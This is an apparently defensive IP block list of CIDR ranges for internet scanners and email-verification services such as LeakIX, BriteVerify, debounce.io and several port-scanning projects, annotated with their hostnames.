#hardian
145.220.91.19/32 # research2.hadrian.io

# LeakIX
159.65.54.69/32
137.184.200.131/32
45.33.108.149/32
172.105.174.28/32
147.182.144.10/32
139.144.188.181/32
165.227.231.149/32
165.227.232.121/32
159.223.102.149/32
159.65.51.215/32
164.92.224.29/32
164.92.143.142/32
164.92.135.200/32
142.93.79.4/32
172.104.249.218/32
147.182.144.7/32
45.33.108.82/32
139.144.188.184/32
139.59.135.127/32
139.162.51.100/32
45.33.108.175/32
128.199.113.120/32
139.162.51.51/32
159.223.62.150/32
139.59.6.30/32
170.187.164.181/32
185.3.94.68/32
139.144.69.48/32
178.62.221.40/32
137.184.12.9/32
45.79.116.239/32
139.144.188.49/32
45.33.108.213/32
45.33.108.188/32
185.3.94.247/32
128.199.221.69/32
170.187.164.180/32
165.227.238.25/32
185.3.94.183/32
170.187.164.177/32
162.243.186.0/24

# scanner.cc gatech.edu
38.110.46.2/32 # scanner1.cc.gatech.edu
38.110.46.211/32 # scanner2.cc.gatech.edu
38.110.46.253/32 # scanner3.cc.gatech.edu
38.110.46.254/32 # scanner4.cc.gatech.edu

# cyberresilience
46.101.142.209/32 # portscanner-fra1-01.prod.cyberresilience.io
138.68.82.30/32 # hosportscanner-fra1-02.prod.cyberresilience.io
164.92.231.143/32 # portscanner-fra1-03.prod.cyberresilience.io
207.154.200.192/32 # portscanner-fra1-04.prod.cyberresilience.io
159.223.16.227/32 # portscanner-fra1-05.prod.cyberresilience.io

24.199.83.252/32 # portscanner-nyc1-01.prod.cyberresilience.io
67.205.188.206/32 # portscanner-nyc1-02.prod.cyberresilience.io
24.199.83.255/32 # portscanner-nyc1-03.prod.cyberresilience.io
24.199.83.167/32 # portscanner-nyc1-04.prod.cyberresilience.io
24.199.83.166/32 # portscanner-nyc1-05.prod.cyberresilience.io

# dublin.scan.bufferover[.]run
192.155.90.118/32

# Actionnet
64.124.8.30/24

# enionsors info
88.214.43.215/32

# Matchplat_Srl_Net
217.61.40.0/21

# project-resonance
164.92.224.19/32

#another deep crappy scanner deepscan iostation io
#deepscan.iostation.io
172.105.85.90/32
172.105.35.108/32
45.79.248.28/32
170.187.155.78/32
172.104.217.92/32
172.104.178.221/32
45.79.178.89/32
103.29.68.35/32
172.104.234.47/32
172.105.96.215/32
198.74.51.93/32
45.79.132.80/32
178.79.177.104/32
45.79.76.157/32
172.105.75.180/32
50.116.16.97/32

# EonScope
45.129.18.0/24 # mnt-us-eonscope-1

#reposify com
71.6.231.0/24 # ip-*.cm.reposify.com

#validity briteverify
3.228.58.155/32 # smtp-proxy-cs-1.briteverify.com
3.223.123.125/32 # smtp-proxy-cs-2.briteverify.com
34.197.104.169/32 # smtp-proxy-cs-3.briteverify.com
52.44.51.117/32 # smtp-proxy-cs-4.briteverify.com
52.202.124.7/32 # smtp-proxy-cs-5.briteverify.com
3.221.98.9/32 # smtp-proxy-cs-6.briteverify.com
54.157.54.237/32 # smtp-proxy-cs-7.briteverify.com
184.72.151.28/32 # smtp-proxy-cs-8.briteverify.com
44.197.53.188/32 # smtp-proxy-cs-9.briteverify.com
34.232.116.127/32 # smtp-proxy-cs-10.briteverify.com
54.156.158.105/32 # smtp-proxy-cs-11.briteverify.com
54.158.80.182/32 # smtp-proxy-cs-12.briteverify.com
52.23.11.248/32 # smtp-proxy-cs-13.briteverify.com
3.210.220.143/32 # smtp-proxy-cs-14.briteverify.com
54.175.101.109/32 # smtp-proxy-cs-15.briteverify.com
54.167.40.143/32 # smtp-proxy-cs-16.briteverify.com
3.223.37.61/32 # smtp-proxy-cs-17.briteverify.com
54.147.175.26/32 # smtp-proxy-cs-18.briteverify.com
50.16.119.226/32 # smtp-proxy-cs-19.briteverify.com
54.166.102.163/32 # smtp-proxy-cs-20.briteverify.com
35.175.66.155/32 # smtp-proxy-cs-21.briteverify.com
54.160.64.251/32 # smtp-proxy-cs-22.briteverify.com
35.174.163.88/32 # smtp-proxy-cs-23.briteverify.com
54.224.228.72/32 # smtp-proxy-cs-24.briteverify.com
34.194.51.179/32 # smtp-proxy-cs-25.briteverify.com
35.168.91.247/32 # smtp-proxy-cs-26.briteverify.com
35.168.135.5/32 # smtp-proxy-cs-27.briteverify.com
52.200.35.98/32 # smtp-proxy-cs-28.briteverify.com
54.146.40.107/32 # smtp-proxy-cs-29.briteverify.com
52.1.33.160/32 # smtp-proxy-cs-30.briteverify.com
54.88.127.218/32 # smtp-proxy-cs-31.briteverify.com
3.232.71.208/32 # smtp-proxy-cs-32.briteverify.com
3.227.74.92/32 # smtp-proxy-cs-33.briteverify.com
54.173.223.130/32 # smtp-proxy-cs-34.briteverify.com
3.229.111.141/32 # smtp-proxy-cs-35.briteverify.com
54.173.88.196/32 # smtp-proxy-cs-36.briteverify.com
34.225.116.109/32 # smtp-proxy-cs-37.briteverify.com
52.70.62.20/32 # smtp-proxy-cs-38.briteverify.com
52.54.13.195/32 # smtp-proxy-cs-39.briteverify.com
52.207.163.228/32 # smtp-proxy-cs-40.briteverify.com
52.200.119.11/32 # smtp-proxy-cs-41.briteverify.com
52.2.233.57/32 # smtp-proxy-cs-42.briteverify.com
44.196.229.67/32 # smtp-proxy-cs-43.briteverify.com
18.233.56.196/32 # smtp-proxy-cs-44.briteverify.com
44.198.43.36/32 # smtp-proxy-cs-45.briteverify.com
3.235.208.252/32 # smtp-proxy-cs-46.briteverify.com
44.193.31.200/32 # smtp-proxy-cs-47.briteverify.com
52.44.242.3/32 # smtp-proxy-cs-48.briteverify.com
3.224.60.101/32 # smtp-proxy-cs-49.briteverify.com
3.228.225.230/32 # smtp-proxy-cs-50.briteverify.com
35.170.48.207/32 # smtp-proxy-cs-51.briteverify.com
52.203.223.246/32 # smtp-proxy-cs-52.briteverify.com
52.44.246.17/32 # smtp-proxy-cs-53.briteverify.com
54.162.102.28/32 # smtp-proxy-cs-54.briteverify.com
3.228.39.2/32 # smtp-proxy-cs-55.briteverify.com
3.215.242.241/32 # smtp-proxy-cs-56.briteverify.com
54.205.35.85/32 # smtp-proxy-cs-57.briteverify.com
54.144.89.167/32 # smtp-proxy-cs-58.briteverify.com
52.71.176.34/32 # smtp-proxy-cs-59.briteverify.com
52.202.15.12/32 # smtp-proxy-cs-60.briteverify.com
3.212.223.103/32 # smtp-proxy-cs-61.briteverify.com
34.231.221.201/32 # smtp-proxy-cs-62.briteverify.com
3.221.217.154/32 # smtp-proxy-cs-63.briteverify.com
34.206.75.232/32 # smtp-proxy-cs-64.briteverify.com
3.94.45.1/32 # smtp-proxy-cs-65.briteverify.com
184.72.232.192/32 # smtp-proxy-cs-66.briteverify.com
52.21.95.149/32 # smtp-proxy-cs-67.briteverify.com
3.218.2.235/32 # smtp-proxy-cs-68.briteverify.com
3.233.203.21/32 # smtp-proxy-cs-69.briteverify.com
52.2.206.87/32 # smtp-proxy-cs-70.briteverify.com
54.146.62.197/32 # smtp-proxy-cs-71.briteverify.com
3.215.237.200/32 # smtp-proxy-cs-72.briteverify.com
3.224.1.165/32 # smtp-proxy-cs-73.briteverify.com
35.169.217.72/32 # smtp-proxy-cs-74.briteverify.com
54.225.76.26/32 # smtp-proxy-cs-75.briteverify.com
54.167.181.191/32 # smtp-proxy-cs-76.briteverify.com
52.204.118.43/32 # smtp-proxy-cs-77.briteverify.com
34.204.142.252/32 # smtp-proxy-cs-78.briteverify.com
54.90.247.23/32 # smtp-proxy-cs-79.briteverify.com
34.232.123.237/32 # smtp-proxy-cs-80.briteverify.com
52.5.85.55/32 # smtp-proxy-cs-81.briteverify.com
44.196.19.163/32 # smtp-proxy-cs-82.briteverify.com
54.86.231.197/32 # smtp-proxy-cs-83.briteverify.com
44.193.61.33/32 # smtp-proxy-cs-84.briteverify.com
107.22.234.30/32 # smtp-proxy-cs-85.briteverify.com
54.164.10.194/32 # smtp-proxy-cs-86.briteverify.com
52.72.4.198/32 # smtp-proxy-cs-87.briteverify.com
18.235.64.31/32 # smtp-proxy-cs-88.briteverify.com
54.147.99.69/32 # smtp-proxy-cs-89.briteverify.com
174.129.246.52/32 # smtp-proxy-cs-90.briteverify.com
34.194.26.98/32 # smtp-proxy-cs-91.briteverify.com
52.22.17.34/32 # smtp-proxy-cs-92.briteverify.com
54.84.143.128/32 # smtp-proxy-cs-93.briteverify.com
107.22.228.121/32 # smtp-proxy-cs-94.briteverify.com
52.3.135.52/32 # smtp-proxy-cs-95.briteverify.com
34.230.192.214/32 # smtp-proxy-cs-96.briteverify.com
52.45.118.124/32 # smtp-proxy-cs-97.briteverify.com
107.21.232.22/32 # smtp-proxy-cs-98.briteverify.com
3.228.134.198/32 # smtp-proxy-cs-99.briteverify.com
3.224.115.144/32 # smtp-proxy-cs-100.briteverify.com
34.228.50.249/32 # smtp-proxy-cs-101.briteverify.com
34.233.163.135/32 # smtp-proxy-cs-102.briteverify.com
34.237.166.87/32 # smtp-proxy-cs-103.briteverify.com
34.227.203.139/32 # smtp-proxy-cs-104.briteverify.com
3.233.11.211/32 # smtp-proxy-cs-105.briteverify.com
52.21.111.67/32 # smtp-proxy-cs-106.briteverify.com
3.209.14.99/32 # smtp-proxy-cs-107.briteverify.com
35.173.22.213/32 # smtp-proxy-cs-108.briteverify.com
54.211.139.154/32 # smtp-proxy-cs-109.briteverify.com
72.44.34.212/32 # smtp-proxy-cs-110.briteverify.com
3.218.189.176/32 # smtp-proxy-cs-111.briteverify.com
23.23.182.117/32 # smtp-proxy-cs-112.briteverify.com
3.214.163.3/32 # smtp-proxy-cs-113.briteverify.com
54.234.106.131/32 # smtp-proxy-cs-114.briteverify.com
34.196.183.125/32 # smtp-proxy-cs-115.briteverify.com
18.215.77.14/32 # smtp-proxy-cs-116.briteverify.com
34.202.74.248/32 # smtp-proxy-cs-117.briteverify.com
44.199.54.248/32 # smtp-proxy-cs-118.briteverify.com
52.23.121.245/32 # smtp-proxy-cs-119.briteverify.com
52.0.222.19/32 # smtp-proxy-cs-120.briteverify.com
54.236.251.133/32 # smtp-proxy-cs-121.briteverify.com
107.20.104.253/32 # smtp-proxy-cs-122.briteverify.com
3.230.110.6/32 # smtp-proxy-cs-123.briteverify.com
54.144.56.137/32 # smtp-proxy-cs-124.briteverify.com
54.147.125.54/32 # smtp-proxy-cs-125.briteverify.com
54.158.80.55/32 # smtp-proxy-cs-126.briteverify.com
34.193.224.91/32 # smtp-proxy-cs-127.briteverify.com
44.197.210.107/32 # smtp-proxy-cs-128.briteverify.com
54.88.91.112/32 # smtp-proxy-cs-129.briteverify.com
3.211.219.65/32 # smtp-proxy-cs-130.briteverify.com
34.204.133.25/32 # smtp-proxy-cs-131.briteverify.com
3.214.168.37/32 # smtp-proxy-cs-132.briteverify.com
44.193.95.227/32 # smtp-proxy-cs-133.briteverify.com
52.0.168.155/32 # smtp-proxy-cs-134.briteverify.com
54.225.2.51/32 # smtp-proxy-cs-135.briteverify.com
3.220.74.60/32 # smtp-proxy-cs-136.briteverify.com
34.232.175.152/32 # smtp-proxy-cs-137.briteverify.com
52.55.90.123/32 # smtp-proxy-cs-138.briteverify.com
34.237.170.4/32 # smtp-proxy-cs-139.briteverify.com
54.147.14.233/32 # smtp-proxy-cs-140.briteverify.com
34.227.240.221/32 # smtp-proxy-cs-141.briteverify.com
35.174.169.216/32 # smtp-proxy-cs-142.briteverify.com
3.230.57.212/32 # smtp-proxy-cs-143.briteverify.com
35.172.126.68/32 # smtp-proxy-cs-144.briteverify.com
34.231.130.108/32 # smtp-proxy-cs-145.briteverify.com
34.225.242.179/32 # smtp-proxy-cs-146.briteverify.com
54.88.2.129/32 # smtp-proxy-cs-147.briteverify.com
34.195.132.242/32 # smtp-proxy-cs-148.briteverify.com
18.205.120.225/32 # smtp-proxy-cs-149.briteverify.com
44.196.18.95/32 # smtp-proxy-cs-150.briteverify.com
3.213.140.40/32 # smtp-proxy-cs-151.briteverify.com
35.169.176.134/32 # smtp-proxy-cs-152.briteverify.com
3.217.88.131/32 # smtp-proxy-cs-153.briteverify.com
54.157.111.178/32 # smtp-proxy-cs-154.briteverify.com
44.199.151.194/32 # smtp-proxy-cs-155.briteverify.com
3.92.36.14/32 # smtp-proxy-cs-156.briteverify.com
54.156.186.103/32 # smtp-proxy-cs-157.briteverify.com
52.203.156.223/32 # smtp-proxy-cs-158.briteverify.com
52.2.158.232/32 # smtp-proxy-cs-159.briteverify.com
44.193.193.192/32 # smtp-proxy-cs-160.briteverify.com
52.55.87.184/32 # smtp-proxy-cs-161.briteverify.com
3.210.33.41/32 # smtp-proxy-cs-162.briteverify.com
52.200.213.119/32 # smtp-proxy-cs-163.briteverify.com
3.217.104.149/32 # smtp-proxy-cs-164.briteverify.com
34.224.159.183/32 # smtp-proxy-cs-165.briteverify.com
23.22.163.26/32 # smtp-proxy-cs-166.briteverify.com
3.218.13.87/32 # smtp-proxy-cs-167.briteverify.com
44.197.10.30/32 # smtp-proxy-cs-168.briteverify.com
54.204.133.104/32 # smtp-proxy-cs-169.briteverify.com
54.86.88.90/32 # smtp-proxy-cs-170.briteverify.com
50.19.222.65/32 # smtp-proxy-cs-171.briteverify.com
3.209.139.68/32 # smtp-proxy-cs-172.briteverify.com
3.231.179.231/32 # smtp-proxy-cs-173.briteverify.com
54.156.105.178/32 # smtp-proxy-cs-174.briteverify.com
3.91.120.142/32 # smtp-proxy-cs-175.briteverify.com
52.3.182.21/32 # smtp-proxy-cs-176.briteverify.com
100.25.250.232/32 # smtp-proxy-cs-177.briteverify.com
54.157.85.140/32 # smtp-proxy-cs-178.briteverify.com
18.214.218.41/32 # smtp-proxy-cs-179.briteverify.com
44.193.112.12/32 # smtp-proxy-cs-180.briteverify.com
35.170.25.140/32 # smtp-proxy-cs-181.briteverify.com
54.82.43.205/32 # smtp-proxy-cs-182.briteverify.com
34.239.87.25/32 # smtp-proxy-cs-183.briteverify.com
52.54.201.198/32 # smtp-proxy-cs-184.briteverify.com
3.235.200.78/32 # smtp-proxy-cs-185.briteverify.com
34.235.219.148/32 # smtp-proxy-cs-186.briteverify.com
35.174.202.230/32 # smtp-proxy-cs-187.briteverify.com
34.203.43.45/32 # smtp-proxy-cs-188.briteverify.com
54.80.225.157/32 # smtp-proxy-cs-189.briteverify.com
52.2.154.82/32 # smtp-proxy-cs-190.briteverify.com
50.19.118.8/32 # smtp-proxy-cs-191.briteverify.com
35.173.88.64/32 # smtp-proxy-cs-192.briteverify.com
35.168.155.54/32 # smtp-proxy-cs-193.briteverify.com
44.195.199.158/32 # smtp-proxy-cs-194.briteverify.com
18.214.188.30/32 # smtp-proxy-cs-195.briteverify.com
18.213.236.120/32 # smtp-proxy-cs-196.briteverify.com
34.200.201.241/32 # smtp-proxy-cs-197.briteverify.com
52.71.26.156/32 # smtp-proxy-cs-198.briteverify.com
54.197.171.247/32 # smtp-proxy-cs-199.briteverify.com
35.153.212.242/32 # smtp-proxy-cs-200.briteverify.com
3.214.141.113/32 # smtp-proxy-cs-201.briteverify.com
3.234.174.78/32 # smtp-proxy-cs-202.briteverify.com
23.22.41.47/32 # smtp-proxy-cs-203.briteverify.com
54.221.2.209/32 # smtp-proxy-cs-204.briteverify.com
54.157.177.96/32 # smtp-proxy-cs-205.briteverify.com
52.205.220.147/32 # smtp-proxy-cs-206.briteverify.com
18.235.147.185/32 # smtp-proxy-cs-207.briteverify.com
18.204.237.119/32 # smtp-proxy-cs-208.briteverify.com
35.172.204.0/32 # smtp-proxy-cs-209.briteverify.com
34.226.156.190/32 # smtp-proxy-cs-210.briteverify.com
52.201.123.22/32 # smtp-proxy-cs-211.briteverify.com
52.207.99.242/32 # smtp-proxy-cs-212.briteverify.com
23.22.8.241/32 # smtp-proxy-cs-213.briteverify.com
3.209.20.64/32 # smtp-proxy-cs-214.briteverify.com
52.5.240.173/32 # smtp-proxy-cs-215.briteverify.com
18.210.89.202/32 # smtp-proxy-cs-216.briteverify.com
18.205.253.82/32 # smtp-proxy-cs-217.briteverify.com
50.19.85.237/32 # smtp-proxy-cs-218.briteverify.com
3.211.25.188/32 # smtp-proxy-cs-219.briteverify.com
54.163.239.140/32 # smtp-proxy-cs-220.briteverify.com
18.206.24.193/32 # smtp-proxy-cs-221.briteverify.com
54.87.74.51/32 # smtp-proxy-cs-222.briteverify.com
54.87.254.124/32 # smtp-proxy-cs-223.briteverify.com
3.83.19.59/32 # smtp-proxy-cs-224.briteverify.com
3.220.206.223/32 # smtp-proxy-cs-225.briteverify.com
34.198.138.214/32 # smtp-proxy-cs-226.briteverify.com
54.144.122.190/32 # smtp-proxy-cs-227.briteverify.com
3.226.45.28/32 # smtp-proxy-cs-228.briteverify.com
34.203.169.207/32 # smtp-proxy-cs-229.briteverify.com
52.22.249.43/32 # smtp-proxy-cs-230.briteverify.com
3.226.196.30/32 # smtp-proxy-cs-231.briteverify.com
44.196.241.218/32 # smtp-proxy-cs-232.briteverify.com
52.54.14.68/32 # smtp-proxy-cs-233.briteverify.com
34.228.34.192/32 # smtp-proxy-cs-234.briteverify.com
52.70.181.244/32 # smtp-proxy-cs-235.briteverify.com
18.215.120.112/32 # smtp-proxy-cs-236.briteverify.com
34.238.58.154/32 # smtp-proxy-cs-237.briteverify.com
3.231.67.99/32 # smtp-proxy-cs-238.briteverify.com
3.212.196.120/32 # smtp-proxy-cs-239.briteverify.com
54.205.222.2/32 # smtp-proxy-cs-240.briteverify.com
3.232.117.196/32 # smtp-proxy-cs-241.briteverify.com
44.199.177.185/32 # smtp-proxy-cs-242.briteverify.com
23.20.246.20/32 # smtp-proxy-cs-243.briteverify.com
3.224.158.62/32 # smtp-proxy-cs-244.briteverify.com
54.243.37.208/32 # smtp-proxy-cs-245.briteverify.com
52.20.134.69/32 # smtp-proxy-cs-246.briteverify.com
3.228.228.161/32 # smtp-proxy-cs-247.briteverify.com
23.23.165.26/32 # smtp-proxy-cs-248.briteverify.com
34.192.105.241/32 # smtp-proxy-cs-249.briteverify.com
18.209.81.123/32 # smtp-proxy-cs-250.briteverify.com
3.221.171.178/32 # smtp-proxy-cs-251.briteverify.com
54.236.196.76/32 # smtp-proxy-cs-252.briteverify.com
100.25.1.16/32 # smtp-proxy-cs-253.briteverify.com
3.211.213.2/32 # smtp-proxy-cs-254.briteverify.com
54.86.165.246/32 # smtp-proxy-cs-255.briteverify.com
3.229.224.53/32 # smtp-proxy-cs-256.briteverify.com
52.201.115.132/32 # smtp-proxy-cs-257.briteverify.com
54.158.61.140/32 # smtp-proxy-cs-258.briteverify.com
3.220.93.11/32 # smtp-proxy-cs-259.briteverify.com
54.204.234.144/32 # smtp-proxy-cs-260.briteverify.com
34.226.2.190/32 # smtp-proxy-cs-261.briteverify.com
3.224.68.96/32 # smtp-proxy-cs-262.briteverify.com
34.233.53.86/32 # smtp-proxy-cs-263.briteverify.com
54.166.12.203/32 # smtp-proxy-cs-264.briteverify.com
54.146.102.26/32 # smtp-proxy-cs-265.briteverify.com
3.230.24.98/32 # smtp-proxy-cs-266.briteverify.com
52.6.59.159/32 # smtp-proxy-cs-267.briteverify.com
18.211.72.183/32 # smtp-proxy-cs-268.briteverify.com
52.206.189.100/32 # smtp-proxy-cs-269.briteverify.com
54.234.136.55/32 # smtp-proxy-cs-270.briteverify.com
54.90.1.36/32 # smtp-proxy-cs-271.briteverify.com
54.198.192.158/32 # smtp-proxy-cs-272.briteverify.com
3.231.191.98/32 # smtp-proxy-cs-273.briteverify.com
52.205.189.43/32 # smtp-proxy-cs-274.briteverify.com
44.196.64.248/32 # smtp-proxy-cs-275.briteverify.com
18.204.122.11/32 # smtp-proxy-cs-276.briteverify.com
34.196.100.242/32 # smtp-proxy-cs-277.briteverify.com
44.195.176.190/32 # smtp-proxy-cs-278.briteverify.com
34.192.87.13/32 # smtp-proxy-cs-279.briteverify.com
18.213.74.163/32 # smtp-proxy-cs-280.briteverify.com
107.21.150.114/32 # smtp-proxy-cs-281.briteverify.com
54.160.189.78/32 # smtp-proxy-cs-282.briteverify.com
100.25.96.7/32 # smtp-proxy-cs-283.briteverify.com
23.22.168.135/32 # smtp-proxy-cs-284.briteverify.com
3.230.202.1/32 # smtp-proxy-cs-285.briteverify.com
54.157.163.95/32 # smtp-proxy-cs-286.briteverify.com
23.22.21.66/32 # smtp-proxy-cs-287.briteverify.com
52.200.180.110/32 # smtp-proxy-cs-288.briteverify.com
3.220.60.193/32 # smtp-proxy-cs-289.briteverify.com
54.164.238.224/32 # smtp-proxy-cs-290.briteverify.com
3.228.101.225/32 # smtp-proxy-cs-291.briteverify.com
52.201.103.237/32 # smtp-proxy-cs-292.briteverify.com
54.84.143.198/32 # smtp-proxy-cs-293.briteverify.com
44.199.134.179/32 # smtp-proxy-cs-294.briteverify.com
34.204.130.121/32 # smtp-proxy-cs-295.briteverify.com
3.209.57.153/32 # smtp-proxy-cs-296.briteverify.com
67.202.20.169/32 # smtp-proxy-cs-297.briteverify.com
54.174.124.192/32 # smtp-proxy-cs-298.briteverify.com
52.0.84.42/32 # smtp-proxy-cs-299.briteverify.com
52.71.28.160/32 # smtp-proxy-cs-300.briteverify.com
52.72.81.76/32 # smtp-proxy-cs-301.briteverify.com
34.238.14.66/32 # smtp-proxy-cs-302.briteverify.com
3.226.201.229/32 # smtp-proxy-cs-303.briteverify.com
52.71.24.164/32 # smtp-proxy-cs-304.briteverify.com
54.160.62.220/32 # smtp-proxy-cs-305.briteverify.com
3.222.133.23/32 # smtp-proxy-cs-306.briteverify.com
34.194.199.143/32 # smtp-proxy-cs-307.briteverify.com
18.215.30.118/32 # smtp-proxy-cs-308.briteverify.com
34.204.227.140/32 # smtp-proxy-cs-309.briteverify.com
34.237.41.207/32 # smtp-proxy-cs-310.briteverify.com
3.229.225.77/32 # smtp-proxy-cs-311.briteverify.com
3.229.54.42/32 # smtp-proxy-cs-312.briteverify.com
3.233.244.127/32 # smtp-proxy-cs-313.briteverify.com
44.197.64.118/32 # smtp-proxy-cs-314.briteverify.com
54.156.177.124/32 # smtp-proxy-cs-315.briteverify.com
54.86.163.122/32 # smtp-proxy-cs-316.briteverify.com
52.200.75.47/32 # smtp-proxy-cs-317.briteverify.com
44.195.64.180/32 # smtp-proxy-cs-318.briteverify.com
34.205.136.60/32 # smtp-proxy-cs-319.briteverify.com
3.230.99.255/32 # smtp-proxy-cs-320.briteverify.com
3.231.122.217/32 # smtp-proxy-cs-321.briteverify.com
3.232.9.181/32 # smtp-proxy-cs-322.briteverify.com
54.88.92.52/32 # smtp-proxy-cs-323.briteverify.com
44.195.161.254/32 # smtp-proxy-cs-324.briteverify.com
18.210.178.23/32 # smtp-proxy-cs-325.briteverify.com
3.229.119.188/32 # smtp-proxy-cs-326.briteverify.com
34.230.176.77/32 # smtp-proxy-cs-327.briteverify.com
3.222.235.170/32 # smtp-proxy-cs-328.briteverify.com
52.206.121.65/32 # smtp-proxy-cs-329.briteverify.com
54.204.180.50/32 # smtp-proxy-cs-330.briteverify.com
23.23.207.86/32 # smtp-proxy-cs-331.briteverify.com
3.231.88.100/32 # smtp-proxy-cs-332.briteverify.com
34.199.210.187/32 # smtp-proxy-cs-333.briteverify.com
54.147.70.54/32 # smtp-proxy-cs-334.briteverify.com
3.212.86.138/32 # smtp-proxy-cs-335.briteverify.com
35.168.79.245/32 # smtp-proxy-cs-336.briteverify.com
3.223.228.102/32 # smtp-proxy-cs-337.briteverify.com
3.209.41.147/32 # smtp-proxy-cs-338.briteverify.com
34.236.87.119/32 # smtp-proxy-cs-339.briteverify.com
52.45.109.94/32 # smtp-proxy-cs-340.briteverify.com
50.19.100.164/32 # smtp-proxy-cs-341.briteverify.com
3.223.18.206/32 # smtp-proxy-cs-342.briteverify.com
23.20.113.8/32 # smtp-proxy-cs-343.briteverify.com
3.217.94.225/32 # smtp-proxy-cs-344.briteverify.com
34.198.17.223/32 # smtp-proxy-cs-345.briteverify.com
35.173.102.227/32 # smtp-proxy-cs-346.briteverify.com
54.237.104.125/32 # smtp-proxy-cs-347.briteverify.com
3.231.236.195/32 # smtp-proxy-cs-348.briteverify.com
54.158.90.81/32 # smtp-proxy-cs-349.briteverify.com
54.86.211.164/32 # smtp-proxy-cs-350.briteverify.com
34.204.225.228/32 # smtp-proxy-cs-351.briteverify.com

174.129.197.53/32 # smtpout1.briteverify.com
174.129.249.234/32 # smtpout2.briteverify.com
174.129.193.225/32 # smtpout3.briteverify.com
50.19.246.56/32 # smtpout4.briteverify.com
75.101.143.45/32 # smtpout5.briteverify.com
174.129.0.126/32 # smtpout6.briteverify.com
184.73.155.120/32 # smtpout7.briteverify.com
184.73.205.138/32 # smtpout8.briteverify.com
107.20.232.98/32 # smtpout9.briteverify.com
107.20.235.139/32 # smtpout10.briteverify.com
107.20.237.69/32 # smtpout11.briteverify.com
50.19.93.176/32 # smtpout12.briteverify.com
50.19.112.185/32 # smtpout13.briteverify.com
50.19.253.57/32 # smtpout14.briteverify.com
107.20.239.247/32 # smtpout15.briteverify.com
107.20.249.220/32 # smtpout16.briteverify.com
50.19.251.234/32 # smtpout17.briteverify.com
174.129.0.51/32 # smtpout18.briteverify.com
184.72.233.158/32 # smtpout19.briteverify.com
184.72.248.0/32 # smtpout20.briteverify.com
23.23.131.0/32 # smtpout21.briteverify.com
50.19.103.141/32 # smtpout22.briteverify.com
50.19.103.149/32 # smtpout23.briteverify.com
50.19.105.17/32 # smtpout24.briteverify.com
50.19.105.75/32 # smtpout25.briteverify.com
50.19.105.217/32 # smtpout26.briteverify.com
50.19.106.236/32 # smtpout27.briteverify.com
50.19.108.183/32 # smtpout28.briteverify.com
50.19.110.184/32 # smtpout29.briteverify.com
107.21.225.31/32 # smtpout30.briteverify.com
50.19.112.2/32 # smtpout31.briteverify.com
54.197.242.12/32 # smtpout32.briteverify.com
54.197.250.255/32 # smtpout33.briteverify.com
54.197.251.0/32 # smtpout34.briteverify.com
107.22.220.143/32 # smtpout35.briteverify.com
184.72.250.117/32 # smtpout36.briteverify.com
184.72.250.175/32 # smtpout37.briteverify.com
184.72.248.161/32 # smtpout38.briteverify.com
184.72.254.136/32 # smtpout39.briteverify.com
174.129.223.9/32 # smtpout40.briteverify.com
54.83.14.2/32 # smtpout41.briteverify.com
54.83.35.164/32 # smtpout42.briteverify.com
54.83.44.163/32 # smtpout43.briteverify.com
107.20.218.183/32 # smtpout44.briteverify.com
107.20.223.96/32 # smtpout45.briteverify.com
107.20.232.108/32 # smtpout46.briteverify.com
107.20.238.46/32 # smtpout47.briteverify.com
107.20.240.190/32 # smtpout48.briteverify.com
107.21.204.157/32 # smtpout49.briteverify.com
107.22.177.152/32 # smtpout50.briteverify.com
54.225.102.177/32 # smtpout51.briteverify.com
54.225.108.187/32 # smtpout52.briteverify.com
54.83.45.43/32 # smtpout53.briteverify.com
54.197.230.106/32 # smtpout54.briteverify.com
54.221.197.174/32 # smtpout55.briteverify.com
54.235.119.112/32 # smtpout56.briteverify.com
107.20.207.58/32 # smtpout57.briteverify.com
174.129.0.46/32 # smtpout58.briteverify.com
107.22.199.138/32 # smtpout59.briteverify.com
107.22.212.75/32 # smtpout60.briteverify.com
107.22.212.106/32 # smtpout61.briteverify.com
54.83.0.221/32 # smtpout62.briteverify.com
54.83.1.195/32 # smtpout63.briteverify.com
54.83.31.89/32 # smtpout64.briteverify.com
54.83.54.115/32 # smtpout65.briteverify.com
54.83.200.29/32 # smtpout66.briteverify.com
107.20.134.42/32 # smtpout67.briteverify.com
107.20.135.215/32 # smtpout68.briteverify.com
107.20.151.86/32 # smtpout69.briteverify.com
107.20.166.122/32 # smtpout70.briteverify.com
34.195.68.199/32 # smtpout71.briteverify.com
52.203.39.60/32 # smtpout72.briteverify.com
52.3.174.189/32 # smtpout73.briteverify.com
34.230.126.212/32 # smtpout74.briteverify.com
34.231.223.157/32 # smtpout75.briteverify.com
34.226.18.50/32 # smtpout76.briteverify.com
52.1.117.226/32 # smtpout77.briteverify.com
52.5.32.234/32 # smtpout78.briteverify.com
54.175.215.209/32 # smtpout79.briteverify.com
34.231.181.18/32 # smtpout80.briteverify.com
35.174.66.167/32 # smtpout81.briteverify.com
18.205.241.149/32 # smtpout82.briteverify.com
34.234.89.13/32 # smtpout83.briteverify.com
54.86.217.177/32 # smtpout84.briteverify.com

54.208.11.136/32 # smtpout1.us.briteverify.com

#ipqualityscore
144.76.117.7/32 # mail86.ipqualityscore.com
178.63.66.138/32 # mail87.ipqualityscore.com
88.198.63.110/32 # mail88.ipqualityscore.com

# nameintel (syn scan) host: greenhousedata
#64.246.161.
64.246.161.26/32 # homer.nameintel.com.
64.246.161.27/32 # todd.nameintel.com.
64.246.161.29/32 # rod.nameintel.com.

# cyber casa CYBER-CASA-MNT
193.163.125.0/24

# recyber net IPVOLUME
89.248.165.0/24

#gerulata com
92.60.50.236/32 # crawler.gerulata.com

#email verif debounce io
94.130.40.84/32 # cm0.debounce.io
94.130.88.8/32 # cm1.debounce.io
138.201.196.251/32 # cm2.debounce.io
178.63.92.13/32 # cm3.debounce.io
88.99.71.250/32 # cm4.debounce.io
46.4.178.186/32 # cm5.debounce.io
138.201.105.14/32 # cm6.debounce.io
95.216.49.190/32 # cm7.debounce.io
88.198.83.130/32 # cm8.debounce.io
95.216.233.209/32 # cm9.debounce.io
95.216.233.210/32 # cm10.debounce.io
46.4.178.109/32 # cm11.debounce.io
78.46.103.66/32 # cm12.debounce.io
94.130.131.71/32 # cm13.debounce.io
78.46.103.92/32 # cm14.debounce.io
94.130.131.69/32 # cm15.debounce.io
94.130.88.9/32 # cm16.debounce.io
78.46.107.152/32 # cm17.debounce.io
178.63.169.236/32 # cm18.debounce.io
178.63.126.221/32 # cm19.debounce.io
178.63.126.220/32 # cm20.debounce.io
88.99.242.114/32 # cm21.debounce.io
88.99.9.147/32 # cm22.debounce.io
46.4.5.231/32 # cm23.debounce.io
94.130.71.159/32 # cm24.debounce.io
